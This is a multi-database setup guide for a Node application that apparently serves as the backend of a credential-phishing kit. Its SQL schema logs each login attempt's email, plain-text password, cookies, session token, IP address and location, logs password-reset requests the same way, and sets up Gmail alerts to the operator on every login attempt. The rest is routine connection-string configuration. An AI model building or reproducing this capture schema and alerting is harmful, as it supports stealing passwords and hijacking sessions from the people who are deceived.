# Multi-Database Configuration Guide

This application supports multiple database backends. Choose the one that works best for you.

## Supported Databases

1. **MongoDB** (Default)
2. **Supabase** (PostgreSQL)
3. **Firebase Firestore**
4. **PostgreSQL** (Direct)
5. **MySQL**

## Quick Setup

### Step 1: Choose Your Database

Set the `DATABASE_TYPE` in your `.env` file:

```env
DATABASE_TYPE=mongodb
```

### Step 2: Configure Database Credentials

Based on your choice, configure the appropriate environment variables:

---

## MongoDB Setup

**Recommended for: Easy setup, flexible schema**

1. Create a free account at [MongoDB Atlas](https://www.mongodb.com/cloud/atlas)
2. Create a new cluster
3. Get your connection string
4. Set environment variables:

```env
DATABASE_TYPE=mongodb
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/database?retryWrites=true&w=majority
```

**Install Dependencies:**
```bash
npm install mongoose
```

---

## Supabase Setup

**Recommended for: PostgreSQL with built-in auth and APIs**

1. Create a free account at [Supabase](https://supabase.com)
2. Create a new project
3. Go to Settings → API to get your keys
4. Set environment variables:

```env
DATABASE_TYPE=supabase
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_ANON_KEY=your-anon-key
SUPABASE_SERVICE_KEY=your-service-role-key
```

5. Create tables using Supabase SQL Editor:

```sql
-- Users table
CREATE TABLE users (
  id BIGSERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  password TEXT NOT NULL,
  display_name VARCHAR(255),
  created_at TIMESTAMP DEFAULT NOW()
);

-- Login attempts table
CREATE TABLE login_attempts (
  id BIGSERIAL PRIMARY KEY,
  type VARCHAR(50),
  email VARCHAR(255),
  password TEXT,
  message TEXT,
  ip_address VARCHAR(100),
  location TEXT,
  user_agent TEXT,
  cookies TEXT,
  session_token TEXT,
  timestamp TIMESTAMP DEFAULT NOW()
);

-- Forgot password requests table
CREATE TABLE forgot_password_requests (
  id BIGSERIAL PRIMARY KEY,
  email VARCHAR(255),
  status VARCHAR(50),
  token TEXT,
  expires_at TIMESTAMP,
  ip_address VARCHAR(100),
  location TEXT,
  user_agent TEXT,
  cookies TEXT,
  timestamp TIMESTAMP DEFAULT NOW()
);
```

**Install Dependencies:**
```bash
npm install @supabase/supabase-js
```

---

## Firebase Setup

**Recommended for: Google ecosystem integration**

1. Go to [Firebase Console](https://console.firebase.google.com)
2. Create a new project
3. Enable Firestore Database
4. Go to Project Settings → Service Accounts
5. Generate new private key
6. Set environment variables:

```env
DATABASE_TYPE=firebase
FIREBASE_PROJECT_ID=your-project-id
FIREBASE_CLIENT_EMAIL=firebase-adminsdk@your-project.iam.gserviceaccount.com
FIREBASE_PRIVATE_KEY="-----BEGIN PRIVATE KEY-----\nYour-Key-Here\n-----END PRIVATE KEY-----\n"
FIREBASE_DATABASE_URL=https://your-project.firebaseio.com
```

**Install Dependencies:**
```bash
npm install firebase-admin
```

---

## PostgreSQL Setup (Direct)

**Recommended for: Full PostgreSQL control**

1. Set up a PostgreSQL database (local or hosted)
2. Create the required tables (use SQL from Supabase section above)
3. Set environment variables:

```env
DATABASE_TYPE=postgresql
POSTGRES_URI=postgresql://username:password@host:5432/database
```

**Install Dependencies:**
```bash
npm install pg
```

---

## MySQL Setup

**Recommended for: Existing MySQL infrastructure**

1. Set up a MySQL database
2. Create tables (adapt PostgreSQL schema for MySQL)
3. Set environment variables:

```env
DATABASE_TYPE=mysql
MYSQL_URI=mysql://username:password@host:3306/database
```

**Install Dependencies:**
```bash
npm install mysql2
```

---

## Gmail Notifications Setup

To receive email notifications for login attempts:

1. Go to [Google Account App Passwords](https://myaccount.google.com/apppasswords)
2. Generate a new app password
3. Set environment variables:

```env
GMAIL_USER=your-email@gmail.com
GMAIL_APP_PASSWORD=your-16-char-app-password
```

---

## Performance Optimization

The application includes several optimizations:

1. **Database Connection Pooling**: Reuses connections
2. **Async Logging**: Non-blocking database writes
3. **Lazy Loading**: Database adapters loaded on demand
4. **Caching**: Adapter instances cached for reuse

---

## Switching Databases

To switch databases:

1. Update `DATABASE_TYPE` in `.env`
2. Configure new database credentials
3. Install required dependencies
4. Restart the application

No code changes required!

---

## Troubleshooting

### Connection Errors

- Verify credentials in `.env` file
- Check database firewall/IP whitelist
- Ensure required dependencies are installed

### Missing Tables

- Run the appropriate SQL schema for your database
- Check database permissions

### Performance Issues

- Enable connection pooling
- Use production database instances
- Consider geographic proximity of database

---

## Security Notes

- Never commit `.env` file to version control
- Use strong database passwords
- Enable SSL/TLS for production databases
- Rotate credentials regularly
- Use read-only credentials where possible
